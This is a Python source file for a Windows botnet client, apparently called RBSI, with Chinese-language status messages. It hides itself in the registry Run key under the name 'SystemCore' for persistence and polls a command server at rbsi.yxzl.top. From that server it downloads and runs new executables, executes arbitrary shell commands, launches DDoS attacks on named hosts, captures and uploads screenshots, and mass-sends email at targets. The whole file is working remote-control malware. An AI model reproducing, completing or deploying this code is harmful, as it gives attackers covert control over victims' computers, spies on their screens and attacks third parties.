import pyautogui
import requests
from socket import gethostname
import subprocess
import sys
import time
import uuid
import win32api
import win32con

import DDOS
from _zmail import send_mail


version = 4
exePath = sys.argv[0]
url = "http://rbsi.yxzl.top:5001/"
key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                          "Software\Microsoft\Windows\CurrentVersion\Run",
                          0,
                          win32con.KEY_WRITE)
win32api.RegSetValueEx(key, "SystemCore", 0, win32con.REG_SZ, exePath)


def init():
    global action
    succeed = False
    action = -1
    while not succeed:
        try:
            r = requests.post(url + "init", data={"name": name}).json()
            if r["version"] > version:
                print("检查到更新，开始下载...")
                try:
                    new_version = r["version"]
                    download_address = r["download_address"]
                    r = requests.get(download_address)
                    exe_name = exePath.split("/" if "/" in exePath else "\\")[-1].split("-")[0] + "-" + str(new_version) + ".exe"
                    with open(exe_name, "wb") as f:
                        f.write(r.content)
                    _key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                                               r"Software",
                                               0,
                                               win32con.KEY_WRITE)
                    win32api.RegSetValueEx(_key, "RBSI-old", 0, win32con.REG_SZ, exePath)
                    subprocess.call("/".join(exePath.split("/" if "/" in exePath else "\\")[:-1]) + "/" + exe_name,
                                    shell=True, stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
                    raise SystemExit
                except SystemExit:
                    raise SystemExit
                except:
                    print("检测到新版本，但是更新失败。")
            action = r["action"]
            print("服务器通讯初始化成功！")
            succeed = True
        except SystemExit:
            raise SystemExit
        except:
            print("服务器通讯初始化失败！15秒后重新尝试...")
            time.sleep(15)


def check_network():
    try:
        if requests.post(url + "check-network").text == "Success":
            return True
        else:
            return False
    except:
        return False


mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
mac = "-".join([mac[e:e + 2] for e in range(0, 11, 2)])
name = gethostname() + "_" + mac
print("当前设备名称：" + name)

action = -1
init()

while True:
    try:
        while True:
            data = {"name": name, "action": action}
            response = requests.post(url + "connect", data=data)
            response = response.json()
            print(response)

            waited = False

            if response.get("show-version"):
                subprocess.call("mshta vbscript:msgbox(\"当前版本：%s\",64,\"RBSI版本\")(window.close)" % version,
                                shell=True, stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)

            if response.get("stop-once"):
                raise SystemExit
            if response.get("stop-forever"):
                key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                                          "Software\Microsoft\Windows\CurrentVersion\Run",
                                          0,
                                          win32con.KEY_WRITE)
                win32api.RegSetValueEx(key, "SystemCore", 0, win32con.REG_SZ, "")
                raise SystemExit

            action = response["action"]
            if response["actions"]:
                for i in response["actions"]:
                    if "all" not in i["send_to"] and name not in i["send_to"]:
                        continue
                    subprocess.call(i["command"], shell=True, stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
                waited = True

            if response["DDOS"]["do"]:
                DDOS.run(times=response["DDOS"]["times"],
                         host=response["DDOS"]["host"],
                         page=response["DDOS"]["page"],
                         port=response["DDOS"]["port"])

            if response.get("getScreen"):
                pyautogui.screenshot("Screenshot.png")
                requests.post(url + "upload", data={"name": name},
                              files={"file": open("Screenshot.png",
                                                  "rb")})
                print("截图成功！")

            if response["mail-attack"]["do"]:
                if response["mail-attack"]["easy"]:
                    for i in range(response["mail-attack"]["times"]):
                        send_mail(from_address=response["mail-attack"]["from-address"],
                                  from_password=response["mail-attack"]["from-password"],
                                  to_address=response["mail-attack"]["to-address"])
                else:
                    for i in range(response["mail-attack"]["times"]):
                        send_mail(from_address=response["mail-attack"]["from-address"],
                                  from_password=response["mail-attack"]["from-password"],
                                  to_address=response["mail-attack"]["to-address"],
                                  from_name=response["mail-attack"]["from-name"],
                                  title=response["mail-attack"]["title"],
                                  content=response["mail-attack"]["content"])
                raise KeyboardInterrupt

            if not waited:
                time.sleep(5)
    except KeyboardInterrupt:
        print("邮件攻击发送成功！")
    except SystemExit:
        raise SystemExit
    except:
        print("未知错误！程序即将重新初始化...")
        init()
